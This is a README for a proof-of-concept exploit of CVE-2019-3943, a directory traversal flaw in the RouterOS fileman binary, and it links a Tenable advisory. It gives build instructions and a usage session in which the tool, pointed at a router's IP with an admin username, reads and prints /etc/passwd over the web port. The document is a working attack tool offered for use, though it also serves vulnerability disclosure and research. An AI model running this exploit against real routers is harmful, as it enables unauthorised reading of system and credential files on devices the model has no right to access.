# CVE-2019-3943 Proof of Concept

This is an implementation of CVE-2019-3943 which is a directory traversal vulnerability affecting the fileman binary in Router OS. This vulnerability was patched in 6.44RC1. See Tenable's advisory at: https://www.tenable.com/security/research/tra-2019-16 

The PoC reads the contents of /etc/passwd via the www port. This PoC will on versions before 6.43.

## What are the build dependencies?

This requires:

* Boost 1.66 or higher
* cmake

## How do I build this jawn?

Just normal cmake. Try this:

```sh
mkdir build
cd build
cmake ..
make
```

Resolve dependencies as needed.

## Usage

Against 6.42.12:

```sh
albinolobster@ubuntu:~/routeros_internal/poc/cve_2019_3943_www/build$ ./cve_2019_3943_www -i 172.20.10.12 -p 80 -u admin

=== File Contents (size: 69) ===
nobody:*:99:99:nobody:/tmp:/bin/sh
root::0:0:root:/home/root:/bin/sh
```
